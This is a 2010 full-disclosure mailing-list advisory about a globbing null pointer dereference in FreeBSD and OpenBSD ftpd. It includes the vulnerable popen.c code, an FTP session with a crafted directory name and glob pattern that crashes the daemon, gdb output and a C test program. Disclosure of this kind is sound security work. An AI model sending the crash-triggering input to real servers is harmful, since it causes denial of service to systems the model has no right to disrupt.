@@ -1,0 +1,186 @@
+
+Date: Fri, 05 Mar 2010 16:19:12 +0100
+From: Kingcope <kcope2@...glemail.com>
+To: full-disclosure@...ts.grok.org.uk, bugtraq@...urityfocus.com
+Subject: FreeBSD and OpenBSD ftpd bug (not exploitable?)
+
+FreeBSD ftpd globbing bug - null pointer dereference ?
+
+Affected FreeBSD Releases
++-+-+-+-+-+-+-+-+-+
+FreeBSD 8.0, 6.3 and 4.9
+
+Affected OpenBSD Releases
++-+-+-+-+-+-+-+-+-+
+OpenBSD 4.6
+
+Testing Environment 
++-+-+-+-+-+-+-+-+-+
+FreeBSD localhost.Belkin 8.0-RELEASE FreeBSD 8.0-RELEASE #0: Sat Nov 21
+15:48:17 UTC 2009
+root@...eida.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
+
+Full Description
++-+-+-+-+-+-+-+-+-+
+FreeBSD (tested back to 4.9-Release) (and OpenBSD 4.6) has a bug in its
+ftpd when handling globbing requests.
+
+My investigation results in this being a null pointer dereference in
+popen.c.
+I am not sure if this could be a heap overrun, but I don't think so.
+
+from popen.c:
+
+	/* glob each piece */
+	gargv[0] = argv[0];
+	for (gargc = argc = 1; argv[argc] && gargc < (MAXGLOBARGS-1); argc++) {
+		glob_t gl;
+		int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;
+
+		memset(&gl, 0, sizeof(gl));
+		gl.gl_matchc = MAXGLOBARGS;
+		flags |= GLOB_LIMIT;
+[1]		if (glob(argv[argc], flags, NULL, &gl))
+			gargv[gargc++] = strdup(argv[argc]);
+[2]		else
+[3]			for (pop = gl.gl_pathv; *pop && gargc < (MAXGLOBARGS-1);
+			     pop++)
+				gargv[gargc++] = strdup(*pop);
+		globfree(&gl);
+	}
+
+At [1] glob() is called. if theres a long directory (for example "A" x
+200) and a request like described
+in "how to repeat this problem" is sent to the ftpd it crashes. My
+assumption is because it lands in the
+else clause [2], glob doesn't fail but gives back a zeroed out gl
+structure. In [3] then there's no check
+if pop is null and therefore *pop gets dereferenced which is a null
+pointer and the ftpd instance crashes.
+
+Could someone please shed some light into why glob doesn't fail but
+gives a zeroed out structure back?
+
+How to repeat the problem
++-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+$ ftp 192.168.2.11
+Connected to 192.168.2.11.
+220 localhost.Belkin FTP server (Version 6.00LS) ready.
+Name (192.168.2.11:nr): kcope
+331 Password required for kcope.
+Password:
+230 User kcope logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> mkdir
+WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
+257
+"WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW" directory created.
+ftp> ls {W*/../W*/../W*/../W*/../W*/../W*/../W*/}
+200 PORT command successful.
+---snip---
+
+on the other side:
+
+---snip---
+0x282261e5 in read () at read.S:3
+3	RSYSCALL(read)
+Current language:  auto; currently asm
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0805622c in getline ()
+(gdb) i r
+eax            0x0	0
+ecx            0x0	0
+edx            0x0	0
+ebx            0xbfbfd911	-1077946095
+esp            0xbfbfba70	0xbfbfba70
+ebp            0xbfbfcc08	0xbfbfcc08
+esi            0x1	1
+edi            0xbfbfcbf4	-1077949452
+eip            0x805622c	0x805622c
+eflags         0x10293	66195
+cs             0x33	51
+ss             0x3b	59
+ds             0x3b	59
+es             0x3b	59
+fs             0x3b	59
+gs             0x1b	27
+(gdb) x/10i $eip
+0x805622c <getline+12620>:	mov    (%edx),%eax
+0x805622e <getline+12622>:	setle  %cl
+0x8056231 <getline+12625>:	mov    %ecx,%esi
+0x8056233 <getline+12627>:	test   %eax,%eax
+0x8056235 <getline+12629>:	je     0x8056281 <getline+12705>
+0x8056237 <getline+12631>:	test   %cl,%cl
+0x8056239 <getline+12633>:	je     0x8056281 <getline+12705>
+0x805623b <getline+12635>:	mov    %edx,%ebx
+0x805623d <getline+12637>:	mov    0xffffee7c(%ebp),%edx
+0x8056243 <getline+12643>:	lea    0xffffee90(%ebp,%edx,4),%edi
+(gdb) i f
+Stack level 0, frame at 0xbfbfcc10:
+ eip = 0x805622c in getline; saved eip 0x805047b
+ called by frame at 0xbfbfcc14
+ Arglist at 0xbfbfcc08, args: 
+ Locals at 0xbfbfcc08, Previous frame's sp is 0xbfbfcc10
+ Saved registers:
+  ebx at 0xbfbfcbfc, ebp at 0xbfbfcc08, esi at 0xbfbfcc00, edi at
+0xbfbfcc04,
+  eip at 0xbfbfcc0c
+(gdb) 
+
+Testing program:
+
+---snip---
+
+#include <glob.h>
+#include <stdio.h>
+
+#define MAXUSRARGS      100
+#define MAXGLOBARGS     1000
+
+void do_glob() {
+        glob_t gl;
+        char **pop;
+
+        char buffer[256];
+        strcpy(buffer, "{A*/../A*/../A*/../A*/../A*/../A*/../A*}");
+
+        int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;
+        memset(&gl, 0, sizeof(gl));
+        gl.gl_matchc = MAXGLOBARGS;
+        flags |= GLOB_LIMIT;
+        if (glob(buffer, flags, NULL, &gl)) {
+                printf("GLOB FAILED!\n");
+                return 0;
+        }
+        else
+//                for (pop = gl.gl_pathv; pop && *pop && 1 <
+(MAXGLOBARGS-1);
+                for (pop = gl.gl_pathv; *pop && 1 < (MAXGLOBARGS-1);
+                     pop++) {
+                        printf("glob success");
+                        return 0;
+                }
+        globfree(&gl);
+}
+
+main(int argc, char **argv) {
+        do_glob();
+        do_glob();
+}
+---snip---
+
+05 March 2010
+/kingcope
+
+
+Content of type "text/html" skipped
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
